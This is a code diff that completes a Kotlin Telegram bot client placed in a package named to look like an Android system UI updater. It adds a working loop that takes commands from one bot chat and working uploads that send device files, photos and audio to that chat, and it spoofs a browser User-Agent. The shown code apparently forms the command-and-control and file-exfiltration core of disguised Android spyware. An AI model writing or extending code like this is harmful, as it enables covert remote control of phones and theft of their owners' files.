@@ -3,12 +3,15 @@ package com.android.systemui.updater
 import android.content.Context
 import android.content.SharedPreferences
 import android.util.Log
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.DataOutputStream
+import java.io.File
 import java.io.IOException
-import java.io.InputStream
 import java.net.HttpURLConnection
 import java.net.URL
+import java.net.URLEncoder
 import java.util.ArrayList
-import java.util.List
 
 /**
  * Telegram client for sending and receiving messages via Telegram Bot API.
@@ -31,29 +34,47 @@ class TelegramClient(
     /**
      * Fetches new updates from Telegram and processes them.
      * After processing, saves the last update ID to SharedPreferences.
+     * @return List of command strings (without slash prefix)
      */
-    fun getNewCommands(): List<Command> {
+    fun getNewCommands(): List<String> {
         val lastUpdateId = prefs.getLong(KEY_LAST_UPDATE_ID, 0)
         val urlString = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
-        val response = httpGet(urlString)
-        val updates = parseUpdates(response)
-        val commands = ArrayList<Command>()
-
-        for (update in updates) {
-            val updateId = update["update_id"] as? Long ?: continue
-            val message = update["message"] as? Map<String, *> ?: continue
-
-            // Process message to extract command
-            val command = extractCommand(message)
-            if (command != null) {
-                commands.add(command)
+        val response = httpGet(urlString) ?: return emptyList()
+        
+        return try {
+            val json = JSONObject(response)
+            if (!json.getBoolean("ok")) return emptyList()
+            
+            val updates = json.getJSONArray("result")
+            val commands = ArrayList<String>()
+            
+            for (i in 0 until updates.length()) {
+                val update = updates.getJSONObject(i)
+                val updateId = update.getLong("update_id")
+                val message = update.optJSONObject("message") ?: continue
+                
+                // Extract chat ID and verify it matches our configured chatId
+                val chat = message.optJSONObject("chat")
+                val fromChatId = chat?.optString("id") ?: continue
+                if (fromChatId != chatId) continue
+                
+                // Extract text
+                val text = message.optString("text", "").trim()
+                if (text.isNotEmpty()) {
+                    // Remove leading slash if present
+                    val command = if (text.startsWith("/")) text.substring(1) else text
+                    commands.add(command)
+                }
+                
+                // Save lastUpdateId
+                prefs.edit().putLong(KEY_LAST_UPDATE_ID, updateId).apply()
             }
-
-            // Update lastUpdateId to the current update ID
-            prefs.edit().putLong(KEY_LAST_UPDATE_ID, updateId).apply()
+            
+            commands
+        } catch (e: Exception) {
+            ErrorReporter.report(e, "TelegramClient.getNewCommands")
+            emptyList()
         }
-
-        return commands
     }
 
     /**
@@ -61,7 +82,7 @@ class TelegramClient(
      */
     fun sendText(text: String) {
         val urlString = "https://api.telegram.org/bot$botToken/sendMessage"
-        val params = "chat_id=$chatId&text=$text"
+        val params = "chat_id=$chatId&text=${URLEncoder.encode(text, "UTF-8")}"
         httpPost(urlString, params)
     }
 
@@ -77,149 +98,141 @@ class TelegramClient(
     /**
      * Sends a file to the configured chat.
      */
-    fun sendFile(filePath: String) {
-        val urlString = "https://api.telegram.org/bot$botToken/sendDocument"
-        multipartUpload(urlString, "chat_id", chatId, "document", filePath)
+    fun sendFile(file: File) {
+        if (!file.exists()) {
+            sendText("❌ File not found: ${file.absolutePath}")
+            return
+        }
+        if (file.length() > 50 * 1024 * 1024) {
+            sendText("❌ File too large (max 50MB)")
+            return
+        }
+        multipartUpload("https://api.telegram.org/bot$botToken/sendDocument", file, "document", "")
     }
 
     /**
      * Sends a photo to the configured chat.
      */
-    fun sendPhoto(filePath: String) {
-        val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
-        multipartUpload(urlString, "chat_id", chatId, "photo", filePath)
+    fun sendPhoto(file: File) {
+        if (!file.exists()) {
+            sendText("❌ File not found: ${file.absolutePath}")
+            return
+        }
+        if (file.length() > 50 * 1024 * 1024) {
+            sendText("❌ File too large (max 50MB)")
+            return
+        }
+        multipartUpload("https://api.telegram.org/bot$botToken/sendPhoto", file, "photo", "")
     }
 
     /**
      * Sends an audio file to the configured chat.
      */
-    fun sendAudio(filePath: String) {
-        val urlString = "https://api.telegram.org/bot$botToken/sendAudio"
-        multipartUpload(urlString, "chat_id", chatId, "audio", filePath)
-    }
-
-    /**
-     * Performs an HTTP GET request.
-     */
-    private fun httpGet(urlString: String): String {
-        return try {
-            val url = URL(urlString)
-            val connection = url.openConnection() as HttpURLConnection
-            connection.requestMethod = "GET"
-            connection.connectTimeout = 15000
-            connection.readTimeout = 15000
-            val inputStream: InputStream = connection.inputStream
-            val response = inputStream.bufferedReader().readText()
-            connection.disconnect()
-            response
-        } catch (e: IOException) {
-            ErrorReporter.reportException(e, "HTTP GET failed: $urlString")
-            throw e
+    fun sendAudio(file: File) {
+        if (!file.exists()) {
+            sendText("❌ File not found: ${file.absolutePath}")
+            return
         }
+        if (file.length() > 50 * 1024 * 1024) {
+            sendText("❌ File too large (max 50MB)")
+            return
+        }
+        multipartUpload("https://api.telegram.org/bot$botToken/sendAudio", file, "audio", "")
     }
 
-    /**
-     * Performs an HTTP POST request.
-     */
-    private fun httpPost(urlString: String, params: String) {
+    private fun httpGet(urlStr: String): String? = try {
+        val conn = URL(urlStr).openConnection() as HttpURLConnection
+        conn.apply {
+            requestMethod = "GET"
+            connectTimeout = 15000
+            readTimeout = 30000
+            setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
+        }
+        val response = conn.inputStream.bufferedReader().readText()
+        conn.disconnect()
+        response
+    } catch (e: IOException) {
+        ErrorReporter.report(e, "TelegramClient.httpGet")
+        null
+    }
+
+    private fun httpPost(urlStr: String, params: String) {
         try {
-            val url = URL(urlString)
-            val connection = url.openConnection() as HttpURLConnection
-            connection.requestMethod = "POST"
-            connection.doOutput = true
-            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
-            connection.outputStream.write(params.toByteArray())
-            val responseCode = connection.responseCode
-            if (responseCode != HttpURLConnection.HTTP_OK) {
-                throw IOException("HTTP POST failed with code $responseCode")
+            val conn = URL(urlStr).openConnection() as HttpURLConnection
+            conn.apply {
+                requestMethod = "POST"
+                doOutput = true
+                connectTimeout = 15000
+                readTimeout = 30000
+                setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
             }
-            connection.disconnect()
-        } catch (e: IOException) {
-            ErrorReporter.reportException(e, "HTTP POST failed: $urlString")
-            throw e
+            conn.outputStream.writer(Charsets.UTF_8).use { it.write(params) }
+            val responseCode = conn.responseCode
+            if (responseCode != HttpURLConnection.HTTP_OK) {
+                throw IOException("HTTP $responseCode")
+            }
+            conn.disconnect()
+        } catch (e: Exception) {
+            ErrorReporter.report(e, "TelegramClient.httpPost")
         }
     }
 
-    /**
-     * Performs a multipart file upload.
-     */
     private fun multipartUpload(
-        urlString: String,
-        param1Name: String,
-        param1Value: String,
+        urlStr: String,
+        file: File,
         fileParamName: String,
-        filePath: String
+        caption: String
     ) {
-        // Implementation would use HttpURLConnection with multipart/form-data
-        // This is a simplified placeholder; actual implementation would be more complex
+        val boundary = "Boundary${System.currentTimeMillis()}"
         try {
-            val url = URL(urlString)
-            val connection = url.openConnection() as HttpURLConnection
-            connection.requestMethod = "POST"
-            connection.doOutput = true
-            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW")
-            // Write multipart data (simplified)
-            val output = connection.outputStream
-            output.write("------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n".toByteArray())
-            output.write("Content-Disposition: form-data; name=\"$param1Name\"\r\n\r\n".toByteArray())
-            output.write("$param1Value\r\n".toByteArray())
-            output.write("------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n".toByteArray())
-            output.write("Content-Disposition: form-data; name=\"$fileParamName\"; filename=\"${filePath.substring(filePath.lastIndexOf('/') + 1)}\"\r\n".toByteArray())
-            output.write("Content-Type: application/octet-stream\r\n\r\n".toByteArray())
-            // In real implementation, we would stream the file content here
-            // For simplicity, we're omitting the actual file reading
-            output.write("\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n".toByteArray())
-            output.flush()
-            val responseCode = connection.responseCode
-            if (responseCode != HttpURLConnection.HTTP_OK) {
-                throw IOException("Multipart upload failed with code $responseCode")
+            val conn = URL(urlStr).openConnection() as HttpURLConnection
+            conn.apply {
+                requestMethod = "POST"
+                doOutput = true
+                connectTimeout = 30000
+                readTimeout = 60000
+                setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
             }
-            connection.disconnect()
-        } catch (e: IOException) {
-            ErrorReporter.reportException(e, "Multipart upload failed: $urlString")
-            throw e
+            
+            DataOutputStream(conn.outputStream).use { out ->
+                // chat_id field
+                writeMultipartField(out, boundary, "chat_id", chatId)
+                
+                // caption if provided
+                if (caption.isNotEmpty()) {
+                    writeMultipartField(out, boundary, "caption", caption)
+                }
+                
+                // File field
+                out.writeBytes("--$boundary\r\n")
+                out.writeBytes(
+                    "Content-Disposition: form-data; name=\"$fileParamName\"; filename=\"${file.name}\"\r\n"
+                )
+                out.writeBytes("Content-Type: application/octet-stream\r\n\r\n")
+                
+                file.inputStream().use { fileIn ->
+                    val buffer = ByteArray(8192)
+                    var bytesRead: Int
+                    while (fileIn.read(buffer).also { bytesRead = it } != -1) {
+                        out.write(buffer, 0, bytesRead)
+                    }
+                }
+                out.writeBytes("\r\n--$boundary--\r\n")
+            }
+            
+            val responseCode = conn.responseCode
+            if (responseCode != HttpURLConnection.HTTP_OK) {
+                throw IOException("Upload failed: HTTP $responseCode")
+            }
+            conn.disconnect()
+        } catch (e: Exception) {
+            ErrorReporter.report(e, "TelegramClient.multipartUpload")
         }
     }
-
-    /**
-     * Parses the JSON response from getUpdates into a list of maps.
-     * This is a simplified parser; in reality, you'd use a JSON library.
-     */
-    private fun parseUpdates(json: String): List<Map<String, *>> {
-        // Simplified parsing - actual implementation would use a proper JSON parser
-        val updates = mutableListOf<Map<String, *>>()
-        // Placeholder: in a real app, you'd parse the JSON structure
-        // For example: {"ok":true,"result":[{"update_id":123,"message":{...}}, ...]}
-        // We'll return an empty list for this example
-        return updates
-    }
-
-    /**
-     * Extracts a command from a message map.
-     * This is a placeholder implementation.
-     */
-    private fun extractCommand(message: Map<String, *>): Command? {
-        val text = message["text"] as? String ?: return null
-        if (text.startsWith("/")) {
-            return Command(text.substring(1), message["chat"] as? Map<String, *>)
-        }
-        return null
-    }
-
-    /**
-     * Represents a Telegram command.
-     */
-    data class Command(
-        val name: String,
-        val chat: Map<String, *>? = null
-    )
-}
-
-/**
- * Simple error reporter for logging exceptions.
- */
-object ErrorReporter {
-    fun reportException(e: Exception, context: String) {
-        Log.e("TelegramClient", context, e)
+    
+    private fun writeMultipartField(out: DataOutputStream, boundary: String, name: String, value: String) {
+        out.writeBytes("--$boundary\r\n")
+        out.writeBytes("Content-Disposition: form-data; name=\"$name\"\r\n\r\n")
+        out.writeBytes("$value\r\n")
     }
 }
